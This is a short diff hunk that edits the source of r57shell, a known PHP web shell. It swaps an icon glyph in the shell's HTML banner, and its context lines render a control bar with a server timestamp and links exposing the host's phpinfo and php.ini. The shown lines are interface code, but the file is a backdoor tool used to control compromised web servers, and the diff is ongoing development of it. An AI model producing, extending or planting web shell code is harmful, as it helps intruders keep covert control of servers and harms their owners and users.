@@ -1492,7 +1492,7 @@ if($unix)
  }
 echo $head;
 echo '</head>';
-echo '<body><table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc width=160><font face=Verdana size=2>'.ws(2).'<font face=Webdings size=6><b>!</b></font><b>'.ws(2).'r57shell '.$version.'</b></font></td><td bgcolor=#cccccc><font face=Verdana size=-2>';
+echo '<body><table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc width=160><font face=Verdana size=2>'.ws(2).'<font face=Webdings size=6><b>⚠</b></font><b>'.ws(2).'r57shell '.$version.'</b></font></td><td bgcolor=#cccccc><font face=Verdana size=-2>';
 echo ws(2)."<b>".date ("d-m-Y H:i:s")."</b>";
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?phpinfo title=\"".$lang[$language.'_text46']."\"><b>phpinfo</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?phpini title=\"".$lang[$language.'_text47']."\"><b>php.ini</b></a> ".$rb;
